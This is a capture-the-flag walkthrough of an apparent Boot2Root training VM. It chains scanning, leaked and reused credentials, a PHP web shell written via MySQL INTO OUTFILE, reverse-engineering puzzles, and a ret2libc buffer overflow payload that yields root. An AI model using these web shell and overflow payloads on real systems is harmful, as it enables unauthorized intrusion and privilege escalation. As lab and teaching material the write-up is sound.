# Network Reconnaissance

## Discovering the Target

We begin by identifying the IP address of the target VM on the local network.

```bash
nmap -sn 192.168.1.0/24
```

The scan reveals three active hosts. The unknown host is:

```
192.168.1.107
```

This is identified as the target machine.

---

## Service Enumeration

Next, we enumerate open ports and running services:

```bash
nmap -sV 192.168.1.107
```

Open services:

* 21/tcp – FTP (vsftpd)
* 22/tcp – SSH
* 80/tcp – HTTP (Apache)
* 443/tcp – HTTPS
* 143/993 – IMAP/IMAPS

This indicates a typical web application server with FTP and mail services.

---

# Web Enumeration

Browsing the web server reveals several interesting directories:

* `/forum/`
* `/phpmyadmin/`
* `/webmail/`

These suggest:

* A forum application
* Database administration panel
* Webmail service

These will be primary attack vectors.

---

# Initial Credential Discovery (Forum)

While browsing the forum, a user accidentally leaked credentials in a log.

Discovered credentials:

```
Username: lmezard
Password: !q\]Ej?*5K5cy*AJ
```

Logging into the forum reveals an associated email:

```
laurie@borntosec.net
```

---

# Email Access (Password Reuse)

Since password reuse is common, we attempt login at:

```
https://192.168.1.107/webmail/
```

Using:

```
Email: laurie@borntosec.net
Password: !q\]Ej?*5K5cy*AJ
```

Login succeeds.

Inside the mailbox, we find database credentials:

```
Username: root
Password: Fg-'kKXBj87E:aJ$
```

---

# Database Access via phpMyAdmin

Accessing:

```
https://192.168.1.107/phpmyadmin/
```

We log in as MySQL root.

This grants full database privileges.

---

# Gaining Remote Code Execution

## Why This Works

MySQL supports:

```
SELECT ... INTO OUTFILE
```

This allows writing arbitrary files to disk.

Since the database runs as `www-data`, we can write a PHP shell into a web-accessible directory.

---

## Creating the Web Shell

```sql
SELECT "<?php system($_GET['cmd']); ?>" 
INTO OUTFILE '/var/www/forum/templates_c/shell.php';
```

The directory `templates_c/` is writable because it is used for template caching.

---

## Verifying Command Execution

Access:

```
https://192.168.1.107/forum/templates_c/shell.php?cmd=whoami
```

Output:

```
www-data
```

We now have command execution as `www-data`.

---

# Local Enumeration

From the shell:

```
ls /home
```

Users found:

* lmezard
* laurie
* thor
* zaz

Searching for readable files:

```
find /home -type f -readable 2>/dev/null
```

We find:

```
/home/LOOKATME/password
```

Contents:

```
lmezard:G!@M6f4Eatau{sF"
```

New credentials obtained.

---

# FTP Access (lmezard)

SSH fails with these credentials, but FTP works:

```bash
ftp 192.168.1.107
```

Login successful.

Files found:

* README
* fun

Download both.

---

# The “fun” Challenge

The file is a tar archive:

```bash
file fun
```

Extract:

```bash
tar -xvf fun
```

Hundreds of small C fragments appear.

Each file contains ordering hints referencing other files.

---

## Reconstructing the Code

Using a script to:

* Extract ordering numbers
* Sort fragments
* Concatenate properly

Produces `fun.c`.

Compile:

```bash
gcc fun.c -o fun
./fun
```

Output:

```
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

Hash it:

```bash
echo -n "Iheartpwnage" | sha256sum
```

Result:

```
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

---

# SSH as laurie

Using the hash as password:

```bash
ssh laurie@192.168.1.107
```

Login successful.

---

# The Binary Bomb (thor password)

In laurie’s home directory:

```
bomb
README
```

The bomb is a classic reverse engineering challenge with 6 phases.

Each phase validates specific input.

---

## Phase Summary

### Phase 1

String comparison:

```
Public speaking is very easy.
```

---

### Phase 2

Mathematical recurrence:

```
a[i] = (i+1) * a[i-1]
```

Solution:

```
1 2 6 24 120 720
```

---

### Phase 3

Switch-case validation.

Valid example:

```
1 b 214
```

---

### Phase 4

Recursive Fibonacci-style function.

Target:

```
func4(x) = 55
```

Solution:

```
9
```

---

### Phase 5

Nibble-masked lookup table.

Transform input → "giants".

Valid input:

```
opukma
```

---

### Phase 6

Linked list reordering.

Nodes must be sorted descending by value.

Correct permutation:

```
4 2 6 3 1 5
```

---

## Final Combined Password (thor)

Concatenating phase results (no spaces):

```
Publicspeakingisveryeasy.126241207201b2149opukma426135
```

Login as thor successful.

---

# Logo (zaz Password)

In thor’s directory, a Logo turtle file is found.

After correcting syntax and executing in a Logo interpreter, the drawing spells:

```
SLASH
```

Hash it:

```bash
echo -n "SLASH" | md5sum
```

Result:

```
646da671ca01bb5d84dbb5fb2238dc8e
```

Login as zaz successful.

---

# Final Level – exploit_me (Root)

Binary:

```
-rwsr-s--- 1 root zaz exploit_me
```

This is a 32-bit setuid root binary.

---

## Vulnerability

The program:

```c
char str[128];
strcpy(str, argv[1]);
```

No bounds check → stack buffer overflow.

---

## Exploit Strategy: ret2libc

We overwrite the saved return address with `system()`.

### Offset Calculation

Using GDB:

```
return_address - buffer_start = 140 bytes
```

---

## Why Fake Return Is Needed

In 32-bit cdecl:

Stack must look like:

```
[ return address ]
[ argument ]
```

So payload must be:

```
"A"*140
+ system_address
+ fake_return (4 bytes)
+ binsh_address
```

---

## Finding "/bin/sh"

Using GDB:

```
find &system,+99999999,"/bin/sh"
```

This searches inside libc.

---

## Little Endian Detail

Intel is little-endian.

Addresses must be reversed byte-wise:

```
0xb7e6b060 → "\x60\xb0\xe6\xb7"
```

Python trick:

```
[::-1]
```

Reverses byte string.

---

## Final Payload

```bash
python -c 'print "A"*140 + "\xb7\xe6\xb0\x60"[::-1] + "AAAA" + "\xb7\xf8\xcc\x58"[::-1]'
```

Execution:

```
./exploit_me <payload>
```

Result:

```
# whoami
root
```

Root shell obtained.

---

# Final Result

Full attack chain:

1. Network enumeration
2. Forum credential leak
3. Email access
4. Database access
5. Web shell upload
6. FTP puzzle
7. SSH lateral movement
8. Reverse engineering challenge
9. Logo puzzle
10. ret2libc exploitation
11. Root shell
